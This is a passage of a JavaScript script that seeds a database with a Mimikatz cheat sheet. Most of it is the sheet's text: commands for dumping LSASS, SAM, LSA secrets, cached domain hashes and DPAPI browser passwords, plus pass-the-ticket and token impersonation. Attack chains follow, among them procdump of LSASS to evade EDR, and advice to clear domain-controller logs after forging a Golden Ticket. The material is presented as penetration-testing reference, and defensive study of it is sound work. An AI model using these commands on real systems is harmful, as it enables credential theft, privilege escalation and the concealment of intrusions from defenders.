sekurlsa::kerberos
\`\`\`
**Description:**
Searches for Kerberos credentials (keytab, session keys).
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
sekurlsa::tspkg
\`\`\`
**Description:**
Searches for TsPkg (Terminal Services) credentials.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
sekurlsa::livessp
\`\`\`
**Description:**
Searches for LiveSSP credentials.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
sekurlsa::minidump lsass.dmp
\`\`\`
**Description:**
Binds a dump file.
**Argument Explanations:**
*   **lsass.dmp**: File path.

**Command:**
\`\`\`bash
sekurlsa::msv
\`\`\`
**Description:**
Searches for MSV1_0 (NTLM) credentials.
**Argument Explanations:**
*   This command takes no arguments.

### LSA/SAM/Secrets

**Command:**
\`\`\`bash
lsadump::sam
\`\`\`
**Description:**
Dumps SAM database.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
lsadump::lsa
\`\`\`
**Description:**
Dumps LSA data.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
lsadump::secrets
\`\`\`
**Description:**
Dumps LSA Secrets data.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
lsadump::cache
\`\`\`
**Description:**
Dumps MSCASH (Domain Cached Credentials) hashes.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
lsadump::trust
\`\`\`
**Description:**
Dumps Domain trust info and passwords.
**Argument Explanations:**
*   This command takes no arguments.

### Kerberos

**Command:**
\`\`\`bash
kerberos::tgt
\`\`\`
**Description:**
Shows current TGT ticket.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
kerberos::list
\`\`\`
**Description:**
Lists all tickets.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
kerberos::ptt ticket.kirbi
\`\`\`
**Description:**
Injects ticket.
**Argument Explanations:**
*   **ticket.kirbi**: Ticket file.

**Command:**
\`\`\`bash
kerberos::purge
\`\`\`
**Description:**
Purges current tickets.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
kerberos::hash
\`\`\`
**Description:**
Converts password to hash.
**Argument Explanations:**
*   **/password**: Password.

### Token Manipulation

**Command:**
\`\`\`bash
token::list
\`\`\`
**Description:**
Lists tokens.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
token::elevate
\`\`\`
**Description:**
Elevates privilege (SYSTEM).
**Argument Explanations:**
*   This command takes no arguments (or /id, /domainadmin).

**Command:**
\`\`\`bash
token::impersonate
\`\`\`
**Description:**
Impersonates a specific token.
**Argument Explanations:**
*   This command takes no arguments (usually used with parameters).

### DPAPI

**Command:**
\`\`\`bash
dpapi::masterkey
\`\`\`
**Description:**
Shows Master Key info.
**Argument Explanations:**
*   **/in**: File path.

**Command:**
\`\`\`bash
dpapi::cred
\`\`\`
**Description:**
Decrypts credential blob.
**Argument Explanations:**
*   **/in**: Blob file.

**Command:**
\`\`\`bash
dpapi::wi
\`\`\`
**Description:**
Decrypts Wi-Fi profiles.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
dpapi::blob
\`\`\`
**Description:**
Decrypts any DPAPI blob.
**Argument Explanations:**
*   **/in**: Blob data.

### Crypto

**Command:**
\`\`\`bash
crypto::certificates
\`\`\`
**Description:**
Lists certificates.
**Argument Explanations:**
*   **/systemstore**: Store name (local_machine etc.).

**Command:**
\`\`\`bash
crypto::keys
\`\`\`
**Description:**
Lists keys.
**Argument Explanations:**
*   **/systemstore**: Store name.

**Command:**
\`\`\`bash
crypto::capi
\`\`\`
**Description:**
CryptoAPI patch (To export non-exportable keys).
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
crypto::sc
\`\`\`
**Description:**
Smart Card operations.
**Argument Explanations:**
*   This command takes no arguments.

### Misc

**Command:**
\`\`\`bash
event::clear
\`\`\`
**Description:**
Clears logs.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
process::list
\`\`\`
**Description:**
Lists running processes.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
process::imports
\`\`\`
**Description:**
Lists process imports.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
!+
\`\`\`
**Description:**
Turns on Mimikatz logo/effect.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
!-
\`\`\`
**Description:**
Turns off Mimikatz logo/effect.
**Argument Explanations:**
*   This command takes no arguments.

## 6. Real Pentest Scenarios

### Credential Extraction with Local Admin
**Technical Description:**
Extracting passwords from LSASS memory with local admin privileges.
**Commands:**
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
\`\`\`
**Argument Explanations:**
*   **privilege::debug**: Acquires debug privilege.
*   **sekurlsa::logonpasswords**: Dumps passwords.

### Limited Credential Enum with Domain User
**Technical Description:**
Listing own Kerberos tickets with a low-privileged user.
**Commands:**
\`\`\`bash
kerberos::list
\`\`\`
**Argument Explanations:**
*   **kerberos::list**: Shows tickets.

### Chained Extraction of SAM + LSA + Secrets on DC
**Technical Description:**
Collecting all local and domain secrets on the Domain Controller.
**Commands:**
\`\`\`bash
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
lsadump::lsa
\`\`\`
**Argument Explanations:**
*   **token::elevate**: Switches to SYSTEM privilege.
*   **lsadump::***: Dumps respective databases.

### Offline Credential Collection via LSASS Minidump
**Technical Description:**
Analyzing dump file on another machine to bypass EDR.
**Commands:**
\`\`\`bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Argument Explanations:**
*   **sekurlsa::minidump**: Loads the dump file.

### Kerberos Ticket Extraction → Pass-the-Ticket
**Technical Description:**
Exporting tickets from memory and injecting into another session.
**Commands:**
\`\`\`bash
sekurlsa::tickets /export
kerberos::ptt [0;3e7]-2-0-60a00000-Admin@krbtgt-DOMAIN.kirbi
\`\`\`
**Argument Explanations:**
*   **/export**: Writes tickets to disk.
*   **kerberos::ptt**: Loads the ticket.

### Privilege Escalation via Token Impersonation
**Technical Description:**
Stealing the token of a SYSTEM privileged process.
**Commands:**
\`\`\`bash
privilege::debug
token::list
token::elevate /id:500
\`\`\`
**Argument Explanations:**
*   **/id**: Target process ID.

### OPSEC-Safe Usage in EDR Blocking
**Technical Description:**
Using procdump instead of running Mimikatz directly.
**Commands:**
\`\`\`bash
# (On Cmd) procdump.exe -ma lsass.exe lsass.dmp
# (On Mimikatz)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Argument Explanations:**
*   **-ma**: Full memory dump (Procdump parameter).

### WDigest Force-Enable → Credential Exposure Analysis
**Technical Description:**
Enabling WDigest in registry (requires reboot) to capture plaintext passwords.
**Commands:**
\`\`\`bash
# Registry change required (Reg add ...)
sekurlsa::wdigest
\`\`\`
**Argument Explanations:**
*   **sekurlsa::wdigest**: Reads WDigest data.

### Chrome/Edge Decryption via DPAPI Credential Extraction
**Technical Description:**
Using Master Key to decrypt browser passwords.
**Commands:**
\`\`\`bash
dpapi::masterkey /in:"%APPDATA%\\Microsoft\\Protect\\SID\\GUID"
dpapi::chrome /in:"Login Data"
\`\`\`
**Argument Explanations:**
*   **/in**: Respective file path.

### lsadump::trust in Domain Trust Relationship Analysis
**Technical Description:**
Viewing Forest/Domain trust passwords.
**Commands:**
\`\`\`bash
privilege::debug
lsadump::trust
\`\`\`
**Argument Explanations:**
*   **lsadump::trust**: Dumps trust info.

### Event Log Clearing + OPSEC Chain
**Technical Description:**
Deleting logs after operation completion.
**Commands:**
\`\`\`bash
event::clear
\`\`\`
**Argument Explanations:**
*   **event::clear**: Deletes logs.

### Extraction after RDP Privilege Escalation
**Technical Description:**
Reading TsPkg credentials in RDP session.
**Commands:**
\`\`\`bash
privilege::debug
sekurlsa::tspkg
\`\`\`
**Argument Explanations:**
*   **sekurlsa::tspkg**: Reads RDP credentials.

### Gathering Hash Info for Silver Ticket
**Technical Description:**
Getting NTLM hash of the service account.
**Commands:**
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
# Or
lsadump::secrets
\`\`\`
**Argument Explanations:**
*   Commands are standard, hash is taken from output.

### TGS Pass-Through Tests
**Technical Description:**
Testing service access with current TGS.
**Commands:**
\`\`\`bash
kerberos::list
# (Windows cmd) dir \\\\target\\c$
\`\`\`
**Argument Explanations:**
*   **kerberos::list**: Verifies ticket.

### Token Delegation in Multi-Hop Attack
**Technical Description:**
Listing and using delegation tokens.
**Commands:**
\`\`\`bash
token::list
token::impersonate
\`\`\`
**Argument Explanations:**
*   **token::impersonate**: Impersonates the token.

### Service Account Credential Discovery
**Technical Description:**
Finding service accounts in LSA Secrets.
**Commands:**
\`\`\`bash
privilege::debug
lsadump::secrets
\`\`\`
**Argument Explanations:**
*   **lsadump::secrets**: Shows service passwords.

### Info Gathering before Domain Lateral Movement
**Technical Description:**
Seeing which users are logged on.
**Commands:**
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
**Argument Explanations:**
*   "User Name" and "Domain" fields in output are analyzed.

## 7. Best Practices (Expert Level)

*   **Prefer minidump over direct LSASS interaction**: Fundamental rule to avoid EDR detection.
*   **Use minidump, not sekurlsa for OPSEC in Domain**: Reading memory on live system is risky.
*   **Manage process chain analysis well after token impersonation**: Constantly check your privilege with \`whoami\` or \`token::whoami\`.
*   **Decrypt DPAPI data offline**: Take blob files and decrypt on your own machine.
*   **No traces left after purge in Kerberos components**: Clean old tickets with \`kerberos::purge\`.
*   **Extraction won't work without debug privilege**: Always run \`privilege::debug\` first.
*   **Always save credentials for offline analysis**: Save outputs to log file (\`/log\`).
*   **Execute TGT/TGS operations on different hosts**: Separate ticket generation and usage.
*   **Clear logs after Golden Ticket generation**: Don't forget to clean logs on DC.

## 8. Common Mistakes

*   **Trying extraction without enabling debug privilege**: You get "Handle invalid" error.
*   **Triggering EDR by working live on LSASS**: Defender or Sentinel catches immediately.
*   **Wrong ticket injection (wrong realm/domain)**: Typing domain name incorrectly when generating ticket.
*   **Taking corrupt minidump file**: Trying to copy file before dump process finishes.
*   **Not checking context after token elevation**: Thinking you are SYSTEM but still remaining in User privilege.
*   **Trying to decrypt DPAPI blobs outside user context**: You cannot decrypt user data with SYSTEM privilege (Except Master Key access).
*   **Trying new ticket without Kerberos purge**: Old ticket might take precedence, creating conflict.
*   **Confusing SAM and LSA dump**: SAM is for local users, LSA for domain/service secrets.
*   **Forgetting WDigest disable state and expecting plaintext**: Default is off in modern Windows, returns null.
`;

async function addMimikatz() {
    try {
        await dbConnect();
        console.log('Connected to DB. Adding Mimikatz cheatsheet...');

        let category = await Category.findOne({ 'name.en': 'Post Exploitation' });
        if (!category) {
            console.log('Category "Post Exploitation" not found, creating...');
            category = await Category.create({
                name: { tr: 'Post Exploitation', en: 'Post Exploitation' },
                description: { tr: 'Sistem ele geçirildikten sonra kullanılan araçlar', en: 'Tools used after system compromise' },
                slug: 'post-exploitation',
                icon: 'Terminal'
            });
        }

        const cheatsheetData = {
            title: {
                tr: 'Mimikatz Cheat Sheet',
                en: 'Mimikatz Cheat Sheet'
            },
            description: {
                tr: contentTR,
                en: contentEN
            },
            category: category._id,
            tags: ['mimikatz', 'credential-dumping', 'lsass', 'kerberos', 'pass-the-hash', 'golden-ticket']
        };

        const result = await Cheatsheet.findOneAndUpdate(
            { 'title.en': 'Mimikatz Cheat Sheet' },
            cheatsheetData,
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        console.log('Mimikatz cheatsheet added/updated successfully:', result.title);

    } catch (error) {
        console.error('Error:', error);
    } finally {
        await mongoose.disconnect();
    }
}

addMimikatz();
